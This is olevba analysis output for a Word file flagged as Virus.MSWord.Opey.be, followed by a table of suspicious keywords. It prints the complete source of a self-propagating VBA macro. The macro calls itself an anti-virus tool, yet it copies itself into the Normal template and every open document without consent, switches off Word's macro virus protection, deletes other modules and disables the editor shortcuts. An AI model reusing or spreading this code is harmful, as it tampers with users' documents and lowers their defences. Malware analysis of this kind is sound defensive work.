olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.be
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.be - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO JiShenhua3.bas 
in file: Virus.MSWord.Opey.be - OLE stream: 'Macros/VBA/JiShenhua3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' ------------------------------------------------------------------------------------
' 原作: FoxChit SOFTWARE SOLUTIONS
' 作者: Ulysses R. Gotera
' 程序改进: 冀慎华
' 日期: 2001年3月
' 功能: 该程序把WORD菜单与工具条初始化到原来状态并删除本模块以外的宏模块.
'-------------------------------------------------------------------------------------
Sub Immunize()
On Error Resume Next
    
    Dim DocuName$, OpenDocImmunized As Boolean
    Dim I%, J%, NmImmunized As Boolean
    Dim LinesofCode As Integer
    Dim openDoc As Document
    
    NmImmunized = False
        
    For I = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
        DocuName = NormalTemplate.VBProject.VBComponents(I).Name
        Select Case DocuName
        Case "JiShenhua3"
            NmImmunized = True
        Case "ThisDocument"
            LinesofCode = NormalTemplate.VBProject.VBComponents(I).CodeModule.CountOfLines
            If LinesofCode > 0 Then
                NormalTemplate.VBProject.VBComponents(I).CodeModule.DeleteLines 1, LinesofCode
            End If
        Case "VirusReport", "JiShenhua" '旧版本杀病毒程序
            Application.OrganizerDelete _
                Source:=NormalTemplate.FullName, Name:=DocuName _
                , Object:=wdOrganizerObjectProjectItems
        Case Else
            msg = "你的 Word 系统中附带有宏程序模块 " + DocuName + _
                ", 极有可能是宏病毒,请选择 '是' 清除该病毒."
            If MsgBox(msg, vbYesNo, "冀慎华向您报告:") = vbYes Then
                Application.OrganizerDelete _
                    Source:=NormalTemplate.FullName, Name:=DocuName _
                    , Object:=wdOrganizerObjectProjectItems
            End If
        End Select
    Next I
    
    For Each openDoc In Documents
        OpenDocImmunized = False
        With openDoc
            For J = openDoc.VBProject.VBComponents.Count To 1 Step -1
                DocuName = openDoc.VBProject.VBComponents(J).Name
                Select Case DocuName
                    Case "JiShenhua3"
                        OpenDocImmunized = True
                    Case "ThisDocument"
                        LinesofCode = openDoc.VBProject.VBComponents(J).CodeModule.CountOfLines
                        If LinesofCode > 0 Then
                            openDoc.VBProject.VBComponents(J).CodeModule.DeleteLines 1, LinesofCode
                        End If
                    Case "Reference to Normal"
                    Case "VirusReport", "JiShenhua" '旧版本杀病毒程序
                        Application.OrganizerDelete Source:=openDoc.FullName, _
                            Name:=DocuName, Object:=wdOrganizerObjectProjectItems
                    Case Else
                        msg = "您的文件 <" + openDoc.Name + "> 中附带有 Word 宏模块 " + DocuName + _
                            ", 极有可能是宏病毒,请选择 '是' 清除该病毒."
                        If MsgBox(msg, vbYesNo, "冀慎华向您报告:") = vbYes Then
                            Application.OrganizerDelete Source:=openDoc.FullName, _
                                Name:=DocuName, Object:=wdOrganizerObjectProjectItems
                        End If
                End Select
            Next J
            
            If Not OpenDocImmunized Then
                Application.OrganizerCopy Source:=NormalTemplate.FullName, _
                Destination:=openDoc.FullName, _
                Name:="JiShenhua3", _
                Object:=wdOrganizerObjectProjectItems
'                If Not openDoc.Saved Then openDoc.SaveAs FileName:=openDoc.FullName
            End If
        End With
    Next openDoc
    
    If Not NmImmunized Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
         Destination:=NormalTemplate.FullName, Name:="JiShenhua3", _
         Object:=wdOrganizerObjectProjectItems
        If Not NormalTemplate.Saved Then NormalTemplate.Save
    End If
    
End Sub
Sub Initialize()
On Error Resume Next
   
   Application.DisplayAlerts = wdAlertsAll
   WordBasic.DisableAutoMacros -1
   
    With Application
        .UserAddress = "冀慎华已为您的机器自动安装了反宏病毒程序,事前未征求您的同意,请见谅."
    End With
    
    With Dialogs(wdDialogFileSummaryInfo)
        .Comments = "该文件已附带了冀慎华编写的反宏病毒程序,事前未征求您的同意,请见谅."
        .Execute
    End With
    
    With Options
        .ConfirmConversions = True
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    
   With CommandBars("Visual Basic")
      .Enabled = True
      .Protection = msoBarTypeMenuBar
      .Protection = msoBarMenuBar
   End With
   
   With CommandBars("Tools")
      .Reset
      .Controls("Macro").Reset
      .Controls("Customize...").Reset
      .Controls("宏(&M)").Reset
      .Controls("自定义(&C)...").Reset
   End With
   
   FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Clear
   FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Clear
   CustomizationContext = NormalTemplate
End Sub
Sub AutoExec()
On Error Resume Next
    Call Initialize
    Call Immunize
End Sub
Sub AutoNew()
On Error Resume Next
    Call Initialize
    Call Immunize
    Dialogs(wdDialogFileNew).Show
    Call Immunize
End Sub
Sub FileNew()
On Error Resume Next
    Call Initialize
    Call Immunize
    Dialogs(wdDialogFileNew).Show
    Call Immunize
End Sub
Sub AutoOpen()
On Error Resume Next
   Call Initialize
   Call Immunize
End Sub
Sub FileOpen()
On Error Resume Next
    Call Initialize
    Call Immunize
    Dialogs(wdDialogFileOpen).Show
    Call Immunize
End Sub
Sub FileSave()
On Error Resume Next
    Call Initialize
    Call Immunize
    If Not ActiveDocument.Saved Then ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
    Call Initialize
    Call Immunize
    Dialogs(wdDialogFileSaveAs).Show
    Call Immunize
End Sub
'Sub FileClose()
'On Error Resume Next
'    Call Initialize
'    Call Immunize
'    If Not ActiveDocument.Saved Then ActiveDocument.Save
'    ActiveDocument.Close
'End Sub
'Sub FileExit()
'On Error Resume Next
'    Call Initialize
'    Call Immunize
'    If Not ActiveDocument.Saved Then ActiveDocument.Save
'    FoxChitForm.Show
'    Application.Quit
'End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

